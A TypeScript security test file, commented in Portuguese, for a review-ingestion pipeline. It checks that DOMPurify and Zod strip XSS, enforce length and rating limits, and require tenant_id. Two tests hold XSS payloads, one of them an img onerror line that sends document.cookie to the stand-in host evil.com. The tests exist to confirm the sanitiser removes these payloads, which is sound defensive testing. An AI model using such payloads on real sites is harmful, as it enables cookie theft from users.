/**
 * @file ingest.security.test.ts
 * @description Testes de segurança para o pipeline de ingestão de reviews.
 * Refs: C9 (Zod + DOMPurify), C2 (tenant_id obrigatório), OWASP A03
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'

// ── Mock do cliente Supabase ─────────────────────────────────────────
const mockFrom = vi.fn().mockReturnValue({
  upsert: vi.fn().mockResolvedValue({ data: [], error: null }),
  select: vi.fn().mockReturnThis(),
  eq:     vi.fn().mockReturnThis(),
  in:     vi.fn().mockReturnThis(),
  single: vi.fn().mockResolvedValue({ data: { id: 'tenant-abc' }, error: null }),
})

vi.mock('../src/lib/supabase.js', () => {
  const client = {
    from: mockFrom,
    rpc: vi.fn().mockResolvedValue({ data: [], error: null }),
  }
  return {
    supabase: client,
    supabaseAdmin: client,
  }
})

vi.mock('../src/lib/sentiment.js', () => ({
  analyzeBatch: vi.fn().mockResolvedValue(undefined),
}))

vi.mock('../src/lib/alerts.js', () => ({
  checkAlerts: vi.fn().mockResolvedValue(undefined),
}))

const validReview = {
  external_id:        '550e8400-e29b-41d4-a716-446655440000',
  author_name:        'Maria Silva',
  rating:             5,
  body:               'Ótimo atendimento, recomendo!',
  channel:            'google_maps' as const,
  published_at:       '2024-01-15T10:30:00.000Z',
}

describe('[C9] Ingestão — Sanitização XSS com DOMPurify + Zod', () => {

  // [APPSEC C9-A] Payload com script tag deve ter HTML removido
  it('deve remover tags <script> do conteúdo do review', async () => {
    const xssPayload = {
      ...validReview,
      body: '<script>alert("xss")</script>Bom serviço',
    }
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(xssPayload)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.body).not.toContain('<script>')
      expect(result.data.body).not.toContain('alert(')
    }
  })

  // [APPSEC C9-B] Payload com img onerror (DOM-based XSS)
  it('deve remover atributos onerror de tags img', async () => {
    const xssPayload = {
      ...validReview,
      body: '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
    }
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(xssPayload)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.body).not.toContain('onerror')
      expect(result.data.body).not.toContain('evil.com')
    }
  })

  // [APPSEC C9-C] Conteúdo excedendo limite máximo (10.000 chars) deve falhar
  it('deve rejeitar conteúdo com mais de 10.000 caracteres', async () => {
    const oversizedPayload = {
      ...validReview,
      body: 'A'.repeat(10_001),
    }
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(oversizedPayload)
    expect(result.success).toBe(false)
    expect(result.error?.issues[0].code).toBe('too_big')
  })

  // [APPSEC C9-D] Rating fora do range [0-5] deve ser rejeitado
  it('deve rejeitar rating = -1 (abaixo do mínimo)', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({ ...validReview, rating: -1 })
    expect(result.success).toBe(false)
  })

  it('deve rejeitar rating = 6 (acima do máximo)', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({ ...validReview, rating: 6 })
    expect(result.success).toBe(false)
  })

  // [APPSEC C9-E] channel inválido deve ser rejeitado
  it('deve rejeitar channel desconhecido', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({
      ...validReview,
      channel: 'malicious_platform',
    })
    expect(result.success).toBe(false)
  })

  // [APPSEC C9-F] Payload completamente válido deve ser aceito
  it('deve aceitar payload válido sem modificação indevida', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(validReview)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.author_name).toBe('Maria Silva')
      expect(result.data.rating).toBe(5)
    }
  })

  // [APPSEC C2] tenant_id deve estar presente em todos os rows do upsert
  it('deve incluir tenant_id em cada row enviado ao banco', async () => {
    const { supabase } = await import('../src/lib/supabase.js')
    const { ingestReviews } = await import('../src/lib/ingest.js') as any

    const upsertSpy = vi.spyOn(supabase.from('reviews' as any), 'upsert')

    // Limpar chamadas anteriores
    upsertSpy.mockClear()

    await ingestReviews([{ ...validReview, tenant_id: 'tenant-abc' }] as any, 'google_maps', 'conn-123', 'biz-123')

    expect(upsertSpy).toHaveBeenCalled()
    const calledWith = upsertSpy.mock.calls[0][0]
    const rows = Array.isArray(calledWith) ? calledWith : [calledWith]
    rows.forEach(row => {
      expect(row).toHaveProperty('tenant_id', 'tenant-abc')
    })
  })

  // [APPSEC C9-G] UPSERT deve usar onConflict correto para deduplicação
  it('deve chamar upsert com onConflict incluindo tenant_id', async () => {
    const { supabase } = await import('../src/lib/supabase.js')
    const { ingestReviews } = await import('../src/lib/ingest.js') as any

    const fromSpy = vi.spyOn(supabase, 'from')

    await ingestReviews([{ ...validReview, tenant_id: 'tenant-abc' }] as any, 'google_maps', 'conn-123', 'biz-123')

    const upsertCall = (fromSpy.mock.results.find(res => {
      // Find the call for 'reviews' table upsert
      return res.type === 'return' && res.value && typeof res.value.upsert === 'function'
    })?.value as any).upsert

    expect(upsertCall).toHaveBeenCalledWith(
      expect.any(Array),
      expect.objectContaining({
        onConflict: expect.stringContaining('tenant_id'),
      })
    )
  })
})

describe('[C9] Ingestão — Author name trimming', () => {
  it('deve remover espaços em branco do author_name', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({
      ...validReview,
      author_name: '   João   ',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.author_name).toBe('João')
    }
  })

  it('deve rejeitar author_name com mais de 255 caracteres', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({
      ...validReview,
      author_name: 'N'.repeat(256),
    })
    expect(result.success).toBe(false)
  })
})
